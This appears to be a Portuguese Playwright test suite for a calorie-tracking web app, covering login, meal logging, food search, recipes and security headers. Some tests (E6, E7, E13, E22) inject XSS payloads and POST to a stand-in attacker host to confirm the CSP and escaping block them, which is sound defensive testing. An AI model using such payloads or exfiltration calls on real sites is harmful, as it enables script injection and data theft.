// Testes do ecrã num Chromium real, com a CSP e os cabeçalhos a sério.
//   node testes-ecra/correr.mjs
import { createRequire } from 'node:module';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
const require = createRequire(import.meta.url);
const { chromium } = require('/home/claude/.npm-global/lib/node_modules/playwright');
const AQUI = path.dirname(new URL(import.meta.url).pathname);
const RAIZ = process.env.RAIZ || path.resolve(AQUI, '..');
const PORTA = 8099, BASE = `http://127.0.0.1:${PORTA}/`;
const LIB = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.112.4/dist/umd/supabase.js';
const FALSO = fs.readFileSync(path.join(AQUI, 'falso-supabase.js'), 'utf8');

const srv = spawn(process.execPath, [path.join(AQUI, 'servidor.mjs'), RAIZ, String(PORTA)], { stdio: 'pipe' });
await new Promise(r => srv.stdout.once('data', r));
const browser = await chromium.launch();
const resultados = [];
const T = (nome, ok, obs = '') => resultados.push({ nome, ok: !!ok, obs });

async function abrir(url, cenario = {}) {
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const externos = [];
  await ctx.route('**/*', (rota) => {
    const u = rota.request().url();
    if (u === LIB) return rota.fulfill({ contentType: 'text/javascript', body: FALSO });
    if (u.startsWith(BASE)) return rota.continue();
    externos.push(u); return rota.abort();
  });
  await ctx.addInitScript((c) => {
    window.__CENARIO__ = c; window.__VIOL__ = [];
    document.addEventListener('securitypolicyviolation', e => window.__VIOL__.push(e.violatedDirective + ' ← ' + (e.blockedURI || 'inline') + (e.sample ? ' [' + e.sample.slice(0, 40) + ']' : '')));
  }, cenario);
  const page = await ctx.newPage();
  const erros = [];
  page.on('pageerror', e => erros.push(String(e)));
  page.on('console', m => { if (m.type() === 'error') erros.push('consola: ' + m.text()); });
  await page.goto(BASE + url, { waitUntil: 'networkidle' });
  await page.waitForTimeout(400);
  return { ctx, page, erros, externos, viol: () => page.evaluate(() => window.__VIOL__) };
}
async function limpo(nome, a) {
  const v = await a.viol();
  T(nome + ' — sem violações da CSP', v.length === 0, v.join(' | '));
  T(nome + ' — sem erros de JavaScript', a.erros.length === 0, a.erros.join(' | ').slice(0, 300));
  T(nome + ' — sem pedidos a servidores de fora', a.externos.length === 0, a.externos.join(', '));
}

// E1 entrada sem sessão
{ const a = await abrir('index.html', { semSessao: true });
  T('E1 entrada mostra o botão do Google', await a.page.locator('#btn-entrar').isVisible());
  await a.page.click('#btn-entrar'); await a.page.waitForTimeout(300);
  T('E1 o botão chama o login do Google', await a.page.evaluate(() => window.__OAUTH__ === true));
  await limpo('E1', a); await a.ctx.close(); }

// E2 entrada com sessão aprovada → segue para o Hoje
{ const a = await abrir('index.html');
  await a.page.waitForURL(/hoje\.html/, { timeout: 5000 }).catch(() => {});
  T('E2 sessão aprovada segue para hoje.html', a.page.url().endsWith('hoje.html'), a.page.url());
  await limpo('E2', a); await a.ctx.close(); }

// E3 pessoa por aprovar fica na espera
{ const a = await abrir('index.html', { aprovado: false });
  T('E3 pessoa por aprovar vê a mensagem de espera', (await a.page.textContent('body')).includes('ainda não foi autorizada'));
  await limpo('E3', a); await a.ctx.close(); }

// E4 hoje: registar um almoço
{ const a = await abrir('hoje.html');
  await a.page.locator('#refeicoes button').filter({ hasText: /^Almoço/ }).click();
  await a.page.fill('#descricao', 'Massa com atum'); await a.page.fill('#kcal', '620');
  await a.page.click('#guardar'); await a.page.waitForTimeout(400);
  T('E4 o almoço fica registado', await a.page.locator('#itens').textContent().then(t => t.includes('Massa com atum')));
  await a.page.click('#fechar'); await a.page.waitForTimeout(200);
  T('E4 o total do dia mostra 620', (await a.page.textContent('#comido')).replace(/\D/g, '') === '620', await a.page.textContent('#comido'));
  await limpo('E4', a); await a.ctx.close(); }

// E5 perfil: preencher e guardar duas vezes no mesmo dia
{ const a = await abrir('perfil.html');
  await a.page.click('#sexo-f'); await a.page.fill('#nascimento', '1995-04-10');
  await a.page.fill('#altura', '165'); await a.page.fill('#peso', '68.4');
  await a.page.selectOption('#atividade', 'moderado'); await a.page.selectOption('#objetivo', '0.5');
  await a.page.click('#guardar'); await a.page.waitForTimeout(500);
  const msg1 = await a.page.textContent('#msg');
  T('E5 guardar o perfil funciona', msg1.includes('Guardado'), msg1);
  T('E5 o gasto aparece depois de guardar', (await a.page.textContent('#g-estimado')).includes('2169'));
  await a.page.fill('#peso', '68.1'); await a.page.click('#guardar'); await a.page.waitForTimeout(500);
  const msg2 = await a.page.textContent('#msg');
  T('E5 corrigir o peso no mesmo dia funciona', msg2.includes('Guardado'), msg2);
  const pedido = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.tabela === 'pesos' && p.modo === 'upsert').map(p => p.corpo));
  T('E5 o ecrã não envia utilizador_id no upsert', pedido.length === 2 && pedido.every(c => !('utilizador_id' in c)), JSON.stringify(pedido));
  await limpo('E5', a); await a.ctx.close(); }

// E6 a CSP trava um ataque por HTML injetado
{ const a = await abrir('hoje.html');
  await a.page.evaluate(() => { const d = document.createElement('div');
    d.innerHTML = '<img src="x" onerror="window.__XSS__ = 1">'; document.body.append(d); });
  await a.page.waitForTimeout(400);
  T('E6 código injetado num atributo NÃO corre', await a.page.evaluate(() => window.__XSS__ === undefined));
  const v = await a.viol();
  T('E6 e o browser regista a tentativa como violação', v.some(x => x.startsWith('script-src')), v.join(' | '));
  await a.ctx.close(); }

// E7 a CSP trava scripts de outros pacotes do mesmo CDN
{ const a = await abrir('hoje.html');
  const r = await a.page.evaluate(() => new Promise(ok => { const s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/pacote-malicioso@1/x.js'; s.onload = () => ok('carregou'); s.onerror = () => ok('bloqueado');
    document.head.append(s); }));
  const v = await a.viol();
  T('E7 outro pacote do jsDelivr é bloqueado pela CSP', r === 'bloqueado' && v.some(x => x.includes('pacote-malicioso')), r + ' · ' + v.join(' | '));
  const f = await a.page.evaluate(() => fetch('https://exemplo-atacante.com/roubar', { method: 'POST', body: 'x' }).then(() => 'enviou').catch(() => 'bloqueado'));
  T('E7 enviar dados para outro servidor é bloqueado', f === 'bloqueado' && (await a.viol()).some(x => x.startsWith('connect-src')), f);
  await a.ctx.close(); }

// E8 fontes servidas pela app
{ const a = await abrir('hoje.html');
  const f = await a.page.evaluate(async () => { await document.fonts.ready;
    return ['IBM Plex Sans', 'Instrument Serif'].map(n => n + ':' + document.fonts.check(`16px "${n}"`)); });
  T('E8 as fontes carregam da própria app', f.every(x => x.endsWith('true')), f.join(', '));
  await a.ctx.close(); }

// E9 cabeçalhos que impedem a app de ser metida noutro site
{ const ctx = await browser.newContext(); const p = await ctx.newPage();
  const r = await p.goto(BASE + 'hoje.html'); const h = r.headers();
  T('E9 frame-ancestors none no cabeçalho', (h['content-security-policy'] || '').includes("frame-ancestors 'none'"));
  T('E9 X-Frame-Options DENY', h['x-frame-options'] === 'DENY');
  await ctx.close(); }

// ---------------------------------------------------------------- pesquisa
const CAT = [
  { id: 'cat-insa-arroz', nome: 'Arroz cozido', marca: null, kcal_100: 130, fonte: 'insa', gramas_unidade: null, nome_unidade: null, codigo_barras: null },
  { id: 'cat-cb-arroz', nome: 'Arroz cozido', marca: 'Marca X', kcal_100: 160, fonte: 'codigo_barras', gramas_unidade: null, nome_unidade: null, codigo_barras: '5601234567892' },
  { id: 'cat-ovo', nome: 'Ovo cozido', marca: null, kcal_100: 155, fonte: 'insa', gramas_unidade: 55, nome_unidade: 'ovo', codigo_barras: null },
];
async function abrirAlmoco(a) {
  await a.page.locator('#refeicoes button').filter({ hasText: /^Almoço/ }).click();
  await a.page.waitForTimeout(250);
}

// E10/E11 pesquisa no catálogo, conflito entre fontes, registo por gramas
{ const a = await abrir('hoje.html', { alimentos: CAT });
  await abrirAlmoco(a);
  await a.page.fill('#procura', 'arroz'); await a.page.waitForTimeout(600);
  const linhas = await a.page.locator('#resultados li').allTextContents();
  T('E10 a pesquisa mostra os dois arrozes com a fonte de cada', linhas.length === 2 && linhas.some(t => t.includes('INSA')) && linhas.some(t => t.includes('código de barras')), linhas.join(' | '));
  const nota = await a.page.locator('#nota-conflito').textContent();
  T('E10 avisa que as fontes não concordam (130 vs 160)', await a.page.locator('#nota-conflito').isVisible() && nota.includes('130') && nota.includes('160'), nota);
  await a.page.locator('#resultados button').filter({ hasText: 'INSA' }).click();
  await a.page.fill('#quantidade', '200'); await a.page.waitForTimeout(100);
  T('E11 200 g de arroz a 130 kcal dá 260', (await a.page.textContent('#esc-kcal')) === '260', await a.page.textContent('#esc-kcal'));
  await a.page.click('#registar-escolhido'); await a.page.waitForTimeout(500);
  const itens = await a.page.locator('#itens').textContent();
  T('E11 fica registado com nome e quantidade', itens.includes('Arroz cozido · 200 g') && itens.includes('260'), itens);
  const ins = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.tabela === 'registos' && p.modo === 'insert').pop().corpo);
  T('E11 guarda gramas, fonte INSA e a ligação ao catálogo, sem dono no pedido', ins.gramas === 200 && ins.fonte === 'insa' && ins.alimento_id === 'cat-insa-arroz' && !('utilizador_id' in ins), JSON.stringify(ins));
  T('E11 a pesquisa volta ao início depois de registar', await a.page.locator('#bloco-pesquisa').isVisible() && (await a.page.inputValue('#procura')) === '');
  await limpo('E10/E11', a); await a.ctx.close(); }

// E12 unidades: 2 ovos
{ const a = await abrir('hoje.html', { alimentos: CAT });
  await abrirAlmoco(a);
  await a.page.fill('#procura', 'ovo'); await a.page.waitForTimeout(600);
  await a.page.locator('#resultados button').first().click();
  T('E12 com unidade, começa em 1 ovo', (await a.page.inputValue('#quantidade')) === '1' && (await a.page.textContent('#rot-quantidade')) === 'Ovos', await a.page.textContent('#rot-quantidade'));
  await a.page.fill('#quantidade', '2'); await a.page.waitForTimeout(100);
  T('E12 2 ovos de 55 g a 155 kcal dá 171', (await a.page.textContent('#esc-kcal')) === '171', await a.page.textContent('#esc-kcal'));
  await a.page.click('#registar-escolhido'); await a.page.waitForTimeout(500);
  T('E12 descrição diz "2 ovos (110 g)"', (await a.page.locator('#itens').textContent()).includes('2 ovos (110 g)'));
  await limpo('E12', a); await a.ctx.close(); }

// E13 Open Food Facts com um nome de produto malicioso
{ const MAU = '<img src=x onerror="window.__XSS__=1">Iogurte';
  const cand = { codigo: '5601312512059', nome: MAU, marca: 'Continente', kcal_100: 69, gramas_unidade: 125, nome_unidade: 'porção' };
  const a = await abrir('hoje.html', { off: { candidatos: [cand], codigos: { '5601312512059': { nome: MAU, marca: 'Continente', kcal_100: 69, gramas_unidade: 125, nome_unidade: 'porção' } } } });
  await abrirAlmoco(a);
  await a.page.fill('#procura', 'iogurte'); await a.page.waitForTimeout(500);
  await a.page.click('#btn-off'); await a.page.waitForTimeout(500);
  T('E13 o nome aparece como texto, não como HTML', (await a.page.locator('#resultados').textContent()).includes('<img src=x') && (await a.page.locator('#resultados img').count()) === 0);
  T('E13 e o código do atacante não correu', await a.page.evaluate(() => window.__XSS__ === undefined));
  await a.page.locator('#resultados button').first().click();
  T('E13 porção de 125 g a 69 kcal dá 86', (await a.page.textContent('#esc-kcal')) === '86', await a.page.textContent('#esc-kcal'));
  await a.page.click('#registar-escolhido'); await a.page.waitForTimeout(500);
  const ped = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.funcao).map(p => p.corpo.acao));
  T('E13 antes de registar, guarda o produto pelo servidor (pesquisa → código)', JSON.stringify(ped) === '["procurar","codigo"]', JSON.stringify(ped));
  const ins = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.tabela === 'registos' && p.modo === 'insert').pop().corpo);
  T('E13 o registo fica ligado ao produto guardado', ins.alimento_id === 'cat-5601312512059' && ins.fonte === 'codigo_barras', JSON.stringify(ins));
  T('E13 nenhuma imagem injetada na lista de itens', (await a.page.locator('#itens img').count()) === 0);
  await limpo('E13', a); await a.ctx.close(); }

// E14 código de barras: encontrado, inexistente, limite
{ const a = await abrir('hoje.html', { off: { codigos: { '3017620422003': { nome: 'Nutella', marca: 'Ferrero', kcal_100: 539, gramas_unidade: 15, nome_unidade: 'porção' } } } });
  await abrirAlmoco(a);
  await a.page.fill('#codigo', '3017620422003'); await a.page.click('#btn-codigo'); await a.page.waitForTimeout(500);
  T('E14 código conhecido abre a quantidade', await a.page.locator('#escolhido').isVisible() && (await a.page.textContent('#esc-nome')).includes('Nutella'));
  await a.page.click('#cancelar-escolhido');
  await a.page.fill('#codigo', '4006381333931'); await a.page.click('#btn-codigo'); await a.page.waitForTimeout(500);
  T('E14 código desconhecido explica que não encontrou', (await a.page.textContent('#msg')).includes('Não encontrei'), await a.page.textContent('#msg'));
  await a.page.fill('#codigo', '12ab'); await a.page.click('#btn-codigo'); await a.page.waitForTimeout(200);
  T('E14 código curto é recusado antes de ir ao servidor', (await a.page.textContent('#msg')).includes('8 e 14'));
  await limpo('E14', a); await a.ctx.close(); }
{ const a = await abrir('hoje.html', { off: { estado: 429, erro: 'Muitos pedidos seguidos. Espera um minuto.' } });
  await abrirAlmoco(a);
  await a.page.fill('#procura', 'arroz'); await a.page.click('#btn-off'); await a.page.waitForTimeout(500);
  T('E15 limite do servidor aparece com a mensagem dele', (await a.page.textContent('#msg')).includes('Espera um minuto'), await a.page.textContent('#msg'));
  T('E15 o botão volta a ficar disponível', await a.page.locator('#btn-off').isEnabled() && (await a.page.textContent('#btn-off')).includes('Open Food Facts'));
  await limpo('E15', a); await a.ctx.close(); }

// E16 produto que já está no catálogo e volta a aparecer no Open Food Facts
{ const a = await abrir('hoje.html', { alimentos: CAT, off: { candidatos: [
      { codigo: '5601234567892', nome: 'Arroz cozido', marca: 'Marca X', kcal_100: 160, gramas_unidade: null, nome_unidade: null },
      { codigo: '5600000000007', nome: 'Arroz basmati', marca: 'Outra', kcal_100: 350, gramas_unidade: null, nome_unidade: null } ] } });
  await abrirAlmoco(a);
  await a.page.fill('#procura', 'arroz'); await a.page.waitForTimeout(600);
  await a.page.click('#btn-off'); await a.page.waitForTimeout(500);
  const linhas = await a.page.locator('#resultados li').allTextContents();
  T('E16 o produto já no catálogo não aparece duas vezes', linhas.length === 3 && linhas.filter(t => t.includes('Marca X')).length === 1, linhas.join(' | '));
  await a.page.locator('#resultados button').filter({ hasText: 'basmati' }).click();
  await a.page.fill('#quantidade', '80'); await a.page.click('#registar-escolhido'); await a.page.waitForTimeout(400);
  const ped = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.funcao).map(p => p.corpo.acao));
  T('E16 produto novo do OFF é guardado pelo servidor antes de registar', JSON.stringify(ped) === '["procurar","codigo"]', JSON.stringify(ped));
  await limpo('E16', a); await a.ctx.close(); }

// ---------------------------------------------------------------- gorduras
const GORD = [
  { id: 'cat-azeite', nome: 'Azeite virgem extra', marca: null, kcal_100: 884, fonte: 'insa', gramas_unidade: null, nome_unidade: null },
  { id: 'cat-manteiga', nome: 'Manteiga', marca: null, kcal_100: 740, fonte: 'insa', gramas_unidade: null, nome_unidade: null },
  { id: 'cat-arroz-cru', nome: 'Arroz agulha cru', marca: null, kcal_100: 350, fonte: 'insa', gramas_unidade: null, nome_unidade: null },
];
{ const a = await abrir('hoje.html', { alimentos: GORD });
  await abrirAlmoco(a);
  await a.page.fill('#procura', 'azeite'); await a.page.waitForTimeout(600);
  await a.page.locator('#resultados button').first().click();
  T('E17 azeite mostra as colheres', await a.page.locator('#ajuda-gordura').isVisible() && (await a.page.textContent('#ajuda-gordura')).includes('Colher de sopa'));
  await a.page.getByRole('button', { name: 'mais uma Colher de sopa' }).click();
  await a.page.getByRole('button', { name: 'mais uma Colher de sopa' }).click();
  T('E17 duas colheres de sopa = 27,4 g', (await a.page.inputValue('#quantidade')) === '27.4', await a.page.inputValue('#quantidade'));
  T('E17 e 242 kcal', (await a.page.textContent('#esc-kcal')) === '242', await a.page.textContent('#esc-kcal'));
  await a.page.getByRole('button', { name: 'mais uma Colher de chá' }).click();
  T('E17 mais uma de chá = 32 g', (await a.page.inputValue('#quantidade')) === '32', await a.page.inputValue('#quantidade'));
  await limpo('E17', a); await a.ctx.close(); }
{ const a = await abrir('hoje.html', { alimentos: GORD });
  await abrirAlmoco(a);
  await a.page.fill('#procura', 'manteiga'); await a.page.waitForTimeout(600);
  await a.page.locator('#resultados button').first().click();
  T('E18 manteiga mostra a barra', await a.page.locator('.barra-manteiga').isVisible());
  await a.page.getByRole('button', { name: '30 gramas' }).click();
  T('E18 três partes = 30 g e 222 kcal', (await a.page.inputValue('#quantidade')) === '30' && (await a.page.textContent('#esc-kcal')) === '222');
  T('E18 a barra mostra 3 partes cheias', (await a.page.locator('.barra-manteiga .parte.cheia').count()) === 3);
  await limpo('E18', a); await a.ctx.close(); }

// ---------------------------------------------------------------- receitas
const HOJE = new Date().toLocaleDateString('sv-SE', { timeZone: 'Europe/Lisbon' });
async function novaReceita(a, nome, porcoes = '4', peso = '800') {
  await a.page.click('#nova');
  await a.page.fill('#r-nome', nome); await a.page.fill('#r-porcoes', porcoes); await a.page.fill('#r-peso', peso);
  await a.page.click('#r-guardar'); await a.page.waitForTimeout(400);
}
async function juntarIngrediente(a, texto, gramas) {
  await a.page.fill('#ing-procura', texto); await a.page.waitForTimeout(600);
  await a.page.locator('#ing-resultados button').first().click();
  if (gramas != null) await a.page.fill('#ing-quantidade', String(gramas));
  return a;
}
{ const a = await abrir('receitas.html', { alimentos: GORD });
  T('E19 sem receitas mostra a explicação', await a.page.locator('#sem-receitas').isVisible());
  await novaReceita(a, 'Arroz de legumes');
  T('E19 criar abre os ingredientes', await a.page.locator('#r-corpo').isVisible() && (await a.page.textContent('#titulo')) === 'Arroz de legumes');
  await juntarIngrediente(a, 'arroz', 200); await a.page.click('#ing-registar-escolhido'); await a.page.waitForTimeout(400);
  await juntarIngrediente(a, 'azeite');
  await a.page.getByRole('button', { name: 'mais uma Colher de sopa' }).click();
  await a.page.getByRole('button', { name: 'mais uma Colher de sopa' }).click();
  T('E19 o botão diz "Juntar à receita"', (await a.page.textContent('#ing-registar-escolhido')) === 'Juntar à receita');
  await a.page.click('#ing-registar-escolhido'); await a.page.waitForTimeout(400);
  const tot = [await a.page.textContent('#r-total'), await a.page.textContent('#r-porcao'), await a.page.textContent('#r-100')];
  T('E19 totais 942 / 236 por porção / 118 por 100 g', tot.join('/') === '942/236/118', tot.join('/'));
  T('E19 dois ingredientes na lista', (await a.page.locator('#r-ingredientes li').count()) === 2);
  const ings = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.tabela === 'receita_ingredientes' && p.modo === 'insert').map(p => p.corpo));
  T('E19 ingredientes guardados em gramas, sem dono no pedido', ings.length === 2 && ings[1].gramas === 27.4 && ings.every(i => !('utilizador_id' in i)), JSON.stringify(ings));
  // registar 1 porção ao almoço, depois 300 g ao jantar
  await a.page.selectOption('#r-refeicao', 'almoco');
  T('E19 uma porção = 236 kcal', (await a.page.textContent('#r-kcal')) === '236');
  await a.page.click('#r-registar'); await a.page.waitForTimeout(400);
  T('E19 confirma o registo', (await a.page.textContent('#msg')).includes('Registado no almoço'), await a.page.textContent('#msg'));
  await a.page.click('#r-modo-gramas');
  T('E19 em gramas, sugere uma porção (200 g)', (await a.page.inputValue('#r-qtd')) === '200');
  await a.page.fill('#r-qtd', '300'); await a.page.selectOption('#r-refeicao', 'jantar');
  T('E19 300 g = 353 kcal', (await a.page.textContent('#r-kcal')) === '353', await a.page.textContent('#r-kcal'));
  await a.page.click('#r-registar'); await a.page.waitForTimeout(400);
  const regs = await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.tabela === 'registos' && p.modo === 'insert').map(p => p.corpo));
  T('E19 registos certos (porção e gramas)', regs.length === 2
    && regs[0].refeicao === 'almoco' && regs[0].kcal === 236 && regs[0].gramas === 200 && regs[0].descricao === 'Arroz de legumes (receita) · 1 porção'
    && regs[1].refeicao === 'jantar' && regs[1].kcal === 353 && regs[1].gramas === 300 && regs.every(r => !('utilizador_id' in r)), JSON.stringify(regs));
  // tirar um ingrediente
  await a.page.getByRole('button', { name: /^Tirar Azeite/ }).click(); await a.page.waitForTimeout(400);
  T('E19 tirar o azeite deixa 700 kcal', (await a.page.textContent('#r-total')) === '700');
  // voltar à lista
  await a.page.click('#voltar'); await a.page.waitForTimeout(400);
  T('E19 a lista mostra a receita e as kcal por porção', (await a.page.textContent('#receitas')).includes('Arroz de legumes') && (await a.page.textContent('#receitas')).includes('175'));
  await limpo('E19', a); await a.ctx.close(); }

{ const a = await abrir('receitas.html', { alimentos: GORD });
  await novaReceita(a, 'Sopa');
  await a.page.click('#voltar'); await a.page.waitForTimeout(300);
  await novaReceita(a, 'Sopa');
  T('E20 nome repetido é explicado', (await a.page.textContent('#msg')).includes('Já tens uma receita com esse nome'), await a.page.textContent('#msg'));
  await limpo('E20', a); await a.ctx.close(); }

{ const a = await abrir('receitas.html', { alimentos: GORD, registos: [{ id: 'r-falta', utilizador_id: 'aaaaaaaa-0000-0000-0000-000000000001', data: HOJE, refeicao: 'jantar', kcal: 0, nao_comi: true }] });
  await novaReceita(a, 'Bacalhau');
  await juntarIngrediente(a, 'arroz', 100); await a.page.click('#ing-registar-escolhido'); await a.page.waitForTimeout(400);
  await a.page.selectOption('#r-refeicao', 'jantar'); await a.page.click('#r-registar'); await a.page.waitForTimeout(400);
  T('E21 não regista num jantar marcado como não comido', (await a.page.textContent('#msg')).includes('não comido'), await a.page.textContent('#msg'));
  T('E21 e não chegou a inserir', (await a.page.evaluate(() => window.__PEDIDOS__.filter(p => p.tabela === 'registos' && p.modo === 'insert').length)) === 0);
  await limpo('E21', a); await a.ctx.close(); }

{ const MAU = '<img src=x onerror="window.__XSS__=1">Bolo';
  const a = await abrir('receitas.html', { alimentos: GORD });
  await novaReceita(a, MAU);
  T('E22 o título mostra o nome como texto', (await a.page.textContent('#titulo')) === MAU && (await a.page.locator('#titulo img').count()) === 0);
  await a.page.click('#voltar'); await a.page.waitForTimeout(300);
  T('E22 a lista também', (await a.page.textContent('#receitas')).includes('<img src=x') && (await a.page.locator('#receitas img').count()) === 0);
  T('E22 e o código não correu', await a.page.evaluate(() => window.__XSS__ === undefined));
  // apagar em dois toques
  await a.page.locator('#receitas button').first().click(); await a.page.waitForTimeout(300);
  await a.page.click('#r-apagar');
  T('E23 o primeiro toque só pede confirmação', (await a.page.textContent('#r-apagar')).includes('outra vez') && (await a.page.evaluate(() => window.__BD__.receitas.length)) === 1);
  await a.page.click('#r-apagar'); await a.page.waitForTimeout(400);
  T('E23 o segundo apaga e volta à lista vazia', (await a.page.evaluate(() => window.__BD__.receitas.length)) === 0 && await a.page.locator('#sem-receitas').isVisible());
  await limpo('E22/E23', a); await a.ctx.close(); }

await browser.close(); srv.kill();
let falhas = 0;
for (const r of resultados) { if (!r.ok) falhas++; console.log((r.ok ? 'PASSA' : '>>> FALHA') + ' | ' + r.nome + (r.ok || !r.obs ? '' : ' | ' + r.obs)); }
console.log(`\nTOTAL ${resultados.length - falhas}/${resultados.length}`);
process.exit(falhas ? 1 : 0);
